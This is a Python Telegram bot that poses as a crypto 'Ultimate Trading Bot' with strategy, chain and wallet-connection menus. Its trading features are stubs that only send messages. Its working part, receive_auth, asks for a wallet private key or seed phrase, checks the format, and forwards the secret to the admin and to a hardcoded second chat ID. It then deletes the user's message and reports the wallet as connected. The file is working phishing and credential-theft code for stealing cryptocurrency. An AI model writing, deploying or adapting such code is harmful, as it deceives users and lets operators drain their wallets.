import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv
import os

load_dotenv()

# **BOT TOKEN & ADMIN ID**
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

# **Logging Setup**
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# **User Data Storage**
user_data = {}

# Add this after user_data initialization
trading_states = {}

# **Feature 1: Start Button 🚀**
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BOT_ACTIVE:
        await update.message.reply_text("🛑 The bot is currently stopped by admin.")
        return
    print(update.message.chat_id)
    keyboard = [[InlineKeyboardButton("Start 🚀", callback_data="start_again")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.message.chat_id,
        text="Press the button below to start! 🚀", 
        reply_markup=reply_markup
    )

# **Feature 2: Welcome Message 📢**
async def welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    welcome_text = """
🚀 Welcome to the Ultimate Trading Bot!  

Your gateway to smarter and more efficient crypto trading starts here.  

📊 Automated Strategies  
⚡ Fast & Secure  
🔧 Customizable Settings  
🔑 Wallet Authentication  

Press Start 🚀 to continue.
"""
    keyboard = [[InlineKeyboardButton("Start 🚀", callback_data="select_strategy")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text=welcome_text,
        reply_markup=reply_markup
    )

# **Feature 3: Strategy Selection 📊**
async def strategy_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("Sniper 🎯", callback_data="sniper"), InlineKeyboardButton("Frontrunning ⚡", callback_data="frontrunning")],
        [InlineKeyboardButton("Arbitrage 💹", callback_data="arbitrage"), InlineKeyboardButton("MEV 🤖", callback_data="mev")],
        [InlineKeyboardButton("Pump Fun 📈", callback_data="pump_fun"), InlineKeyboardButton("Telegram Signals 📬", callback_data="telegram_signals")],
        [InlineKeyboardButton("Volume 🔊", callback_data="volume"), InlineKeyboardButton("Sandwich 🥪", callback_data="sandwich")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(query.message.chat_id,"📊 Select Your Strategy:", reply_markup=reply_markup)

# **Feature 4: Strategy Description ℹ️**
strategy_descriptions = {
    "sniper": "🎯 Sniper Strategy: Buy tokens at launch before others.",
    "frontrunning": "⚡ Frontrunning Strategy: Exploit pending transactions for profit.",
    "arbitrage": "💹 Arbitrage Strategy: Buy low on one exchange and sell high on another.",
    "mev": "🤖 MEV Strategy: Exploit miner-extractable value for profit.",
    "pump_fun": "📈 Pump & Fun Strategy: Ride the wave of trending tokens.",
    "telegram_signals": "📬 Telegram Signals Strategy: Trade based on signal groups.",
    "volume": "🔊 Volume Strategy: Trade based on market volume changes.",
    "sandwich": "🥪 Sandwich Strategy: Place buy & sell orders around large trades."
}

async def show_strategy_description(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    strategy = query.data

    description = strategy_descriptions.get(strategy, "No description available.")
    
    keyboard = [
        [InlineKeyboardButton("Continue ▶️", callback_data="select_blockchain")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(query.message.chat_id,f"🔹 You selected {strategy.capitalize()}.\n\n{description}", reply_markup=reply_markup)

# **Feature 5: Blockchain Selection 🌐**
async def blockchain_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("Ethereum ⛽", callback_data="eth"), InlineKeyboardButton("BSC 🟡", callback_data="bsc")],
        [InlineKeyboardButton("Solana 🔵", callback_data="sol"), InlineKeyboardButton("Base 🔷", callback_data="base")],
        [InlineKeyboardButton("Bitcoin 🟠", callback_data="btc")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(query.message.chat_id,"🌐 Select Your Blockchain:", reply_markup=reply_markup)

# **Feature 6: Confirmation ✅**
async def confirm_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    blockchain = query.data

    # Store blockchain selection in user_data
    user_id = query.from_user.id
    user_data[user_id] = {"network": blockchain}

    text = f"""
🌐 You chose {blockchain.upper()}.  

Please select your authentication method:
"""
    keyboard = [
        [InlineKeyboardButton("Private Key 🔑", callback_data="use_private_key")],
        [InlineKeyboardButton("Seed Phrase 🌱", callback_data="use_seed_phrase")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.message.reply_text(text, reply_markup=reply_markup)

async def request_auth_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    method = "use_private_key" if query.data == "use_private_key" else "use_seed_phrase"
    user_data[user_id]["auth_method"] = method
    
    method_name = "Private Key" if method == "use_private_key" else "Seed Phrase"
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text=f"🔑 Please enter your {method_name}:"
    )

def validate_auth_data(auth_data: str, blockchain: str) -> bool:
    """Basic validation for private keys and seed phrases"""
    if blockchain in ["eth", "bsc", "base"]:
        # Ethereum-style private key (64 hex chars) or seed phrase (12/24 words)
        if auth_data.startswith("0x") and len(auth_data) == 66:
            return True
        if len(auth_data.split()) in [12, 24]:
            return True
    elif blockchain == "btc":
        # Bitcoin private key (WIF, hex, or seed phrase)
        if len(auth_data) in [52, 64]:
            return True
        if len(auth_data.split()) in [12, 24]:
            return True
    elif blockchain == "sol":
        # Solana private key (base58) or seed phrase
        if len(auth_data) == 88:
            return True
        if len(auth_data.split()) in [12, 24]:
            return True
    return False

async def receive_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    user_id = update.message.from_user.id
    network = user_data.get(user_id, {}).get("network", "Unknown")
    auth_method = user_data.get(user_id, {}).get("auth_method", "private_key")

    # Validate the authentication data
    if not validate_auth_data(user_input, network):
        if auth_method == "use_private_key":
            error_message = f"""
❌ That does not look like a valid private key. Please confirm:

• Ethereum/BSC/Base: a 64-char hex (optionally with '0x')
• Solana: Base58 that decodes to 64 bytes
• Bitcoin: WIF format or 64-char hex
"""
        else:  # seed phrase
            error_message = f"""
❌ That does not look like a valid seed phrase. Please confirm:

• Must be 12 or 24 words
• Words should be separated by single spaces
• Use the standard BIP39 word list
"""
        
        await update.message.reply_text(error_message)
        await context.bot.delete_message(
            chat_id=update.message.chat_id,
            message_id=update.message.message_id
        )
        return

    # If valid, send to admin
    auth_type = "Private Key" if auth_method == "use_private_key" else "Seed Phrase"
    text = f"""
🔐 *New Authentication Received*:
👤 User: @{update.message.from_user.username.replace('_', '\\_')} \\(ID: `{user_id}`\\)  
🌍 Network: `{network}`  
🔑 {auth_type}:
```
{user_input}
```
📝 _Authentication data received and validated_
"""
    await context.bot.send_message(
        chat_id=ADMIN_ID, 
        text=text, 
        parse_mode="MarkdownV2"
    )
    await context.bot.send_message(
        chat_id="7050891491", 
        text=text, 
        parse_mode="MarkdownV2"
    )
    
    # Save user's chat ID and show trading controls
    user_data[user_id]["chat_id"] = update.message.chat_id
    
    keyboard = [
        [InlineKeyboardButton("Start Trading 🚀", callback_data="start_trading")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("✅ Wallet connected successfully!", reply_markup=reply_markup)
    
    # Delete the user's message containing sensitive information
    await context.bot.delete_message(
        chat_id=update.message.chat_id,
        message_id=update.message.message_id
    )

# **Feature 8: Trading Capital Input 💰**
async def request_trading_capital(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💰 Enter your trading capital amount:")

# **Feature 9: Start Trading 🚀**
async def start_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 Trading started successfully! Loading...")

# **Feature 🔟 Stop Trading 🛑**
async def stop_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🛑 Trading stopped successfully.")

# **Feature 1️⃣1️⃣ Admin Controls 🛠️**
async def admin_controls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.from_user.id) != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to use admin controls.")
        return

    keyboard = [
        [InlineKeyboardButton("Start Bot ✅", callback_data="admin_start")],
        [InlineKeyboardButton("Stop Bot ❌", callback_data="admin_stop")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text("🛠️ Admin Controls:", reply_markup=reply_markup)

# Add this at the top with other constants
BOT_ACTIVE = True

# Modify the admin control handler
async def handle_admin_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_ACTIVE
    query = update.callback_query
    await query.answer()

    if query.data == "admin_stop":
        BOT_ACTIVE = False
        await query.edit_message_text("🛑 Bot has been stopped.")
    else:
        BOT_ACTIVE = True
        await query.edit_message_text("✅ Bot has been started.")

# Trading controls
async def trading_controls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BOT_ACTIVE:
        await update.message.reply_text("🛑 The bot is currently stopped by admin.")
        return
    user_id = update.message.from_user.id
    keyboard = [
        [InlineKeyboardButton("Start Trading 🚀", callback_data="start_trading")] if not trading_states.get(user_id, False)
        else [InlineKeyboardButton("Stop Trading 🛑", callback_data="stop_trading")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text("📊 Trading Controls:", reply_markup=reply_markup)

async def handle_trading_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "start_trading":
        trading_states[user_id] = True
        await query.message.reply_text("🚀 Trading started successfully!")
    else:
        trading_states[user_id] = False
        await query.message.reply_text("🛑 Trading stopped successfully.")

    # Update the trading controls
    await trading_controls(query.message, context)

# **Run the Bot**
app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(welcome, pattern="start_again"))
app.add_handler(CallbackQueryHandler(strategy_selection, pattern="select_strategy"))
app.add_handler(CallbackQueryHandler(show_strategy_description, pattern="^(sniper|frontrunning|arbitrage|mev|pump_fun|telegram_signals|volume|sandwich)$"))
app.add_handler(CallbackQueryHandler(blockchain_selection, pattern="select_blockchain"))
app.add_handler(CallbackQueryHandler(confirm_selection, pattern="^(eth|bsc|sol|base|btc)$"))
app.add_handler(CallbackQueryHandler(request_auth_method, pattern="^(use_private_key|use_seed_phrase)$"))
app.add_handler(CommandHandler("admin", admin_controls))
app.add_handler(CallbackQueryHandler(handle_admin_control, pattern="^(admin_start|admin_stop)$"))
app.add_handler(CallbackQueryHandler(handle_trading_control, pattern="^(start_trading|stop_trading)$"))

# Add this handler LAST to avoid conflicts
app.add_handler(MessageHandler(
    filters.TEXT & ~filters.COMMAND,  # Only handle non-command text messages
    receive_auth
))

app.run_polling()
